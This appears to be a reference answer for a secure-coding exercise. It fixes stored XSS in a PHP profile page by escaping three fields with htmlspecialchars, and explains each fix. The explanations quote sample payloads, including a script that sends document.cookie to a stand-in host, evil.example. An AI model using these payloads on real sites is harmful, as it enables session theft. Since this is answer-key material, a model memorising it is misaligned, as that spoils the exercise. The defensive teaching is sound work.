## Reference solution

```php
// ------------------------------------------------------------------------
// ANSWER — Unescaped User HTML in Profile
// ------------------------------------------------------------------------

<?php
// public/profile.php

require_once __DIR__ . '/../src/db.php';

$userId = (int) $_GET['id'];

$stmt = $pdo->prepare("SELECT display_name, bio, avatar_url FROM users WHERE id = ?");
$stmt->execute([$userId]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);

if (!$user) {
    http_response_code(404);
    echo "User not found";
    exit;
}
?>
<!DOCTYPE html>
<html>
<head><title>Profile</title></head>
<body>
  // CHANGE 1: wrap display_name in htmlspecialchars to neutralise any HTML/JS that was stored at registration time
  <h1><?php echo htmlspecialchars($user['display_name'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); ?></h1>
  // CHANGE 3: wrap avatar_url in htmlspecialchars to prevent attribute-breaking or javascript: URI injection inside the src attribute
  <img src="<?php echo htmlspecialchars($user['avatar_url'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); ?>" alt="avatar">
  // CHANGE 2: wrap bio in htmlspecialchars to neutralise stored script tags, event handlers, or other HTML in the bio field
  <p><?php echo htmlspecialchars($user['bio'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); ?></p>
</body>
</html>
```

## Explanation

### Issue 1: Unescaped display_name Output

**Problem:** `display_name` is echoed directly into an `<h1>` element. Any HTML stored in that field by the user at registration time renders as markup. A value like `<script>document.location='https://evil.example/?c='+document.cookie</script>` executes immediately for every visitor, which is exactly what the session-theft reports describe.

**Fix:** Replace `echo $user['display_name']` with `echo htmlspecialchars($user['display_name'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')`. This converts `<`, `>`, `"`, `'`, and `&` into their HTML entity equivalents before the browser sees them.

**Explanation:** The junior developer's assumption — "the data comes from the database so it's safe" — ignores that the database faithfully stores whatever the registration form accepted. If no sanitization happened at write time, the raw payload sits there untouched. When the profile page reads it back and echoes it, the browser treats the string as HTML, not data. `htmlspecialchars` is an output-context function: it converts characters that carry structural meaning in HTML into inert entity references, so the browser renders the literal text instead of interpreting it as markup. `ENT_QUOTES` is required to also escape single quotes, which matter when the value lands inside a single-quoted HTML attribute. `ENT_SUBSTITUTE` replaces invalid UTF-8 sequences with the Unicode replacement character instead of returning an empty string, which prevents a separate bypass via malformed encoding.

---

### Issue 2: Unescaped bio Output

**Problem:** `bio` is echoed directly into a `<p>` element without escaping. A stored payload such as `<img src=x onerror=alert(1)>` or `<script>…</script>` runs in every visitor's browser, giving the attacker persistent execution on everyone who views the profile.

**Fix:** Replace `echo $user['bio']` with `echo htmlspecialchars($user['bio'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')`, matching the same call used for `display_name`.

**Explanation:** Stored XSS (payload written once, executed for many viewers) is more damaging than reflected XSS because the attacker does not need to trick each victim into clicking a crafted link — simply sharing a profile URL is enough. The bio field is typically longer and more free-form than a display name, so attackers have more room to craft payloads that evade naive filters. The fix is identical to Issue 1: encode at the point of output, in the correct context (HTML body), using `htmlspecialchars`.

---

### Issue 3: Unescaped avatar_url in HTML Attribute

**Problem:** `avatar_url` is echoed directly into the `src` attribute of an `<img>` tag. A stored value of `" onerror="alert(document.cookie)` breaks out of the attribute and injects a new event handler. A value of `javascript:void(0)` in certain browser/tag combinations can also execute script.

**Fix:** Replace `echo $user['avatar_url']` with `echo htmlspecialchars($user['avatar_url'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')` so that double quotes, single quotes, and angle brackets in the URL are encoded before they land inside the HTML attribute.

**Explanation:** Attribute context requires the same HTML entity encoding as body context, but the risk is slightly different: the injected text does not need to introduce a full tag — it only needs to close the current attribute value with a `"` and then append new attributes. Without `ENT_QUOTES`, a single-quote-delimited attribute would still be vulnerable even after applying `htmlspecialchars` with default flags, so the `ENT_QUOTES` flag is essential. For URLs specifically, an additional production-hardening step is to validate that the value starts with `https://` or a relative path before rendering it, but `htmlspecialchars` is the minimum required fix to stop injection.
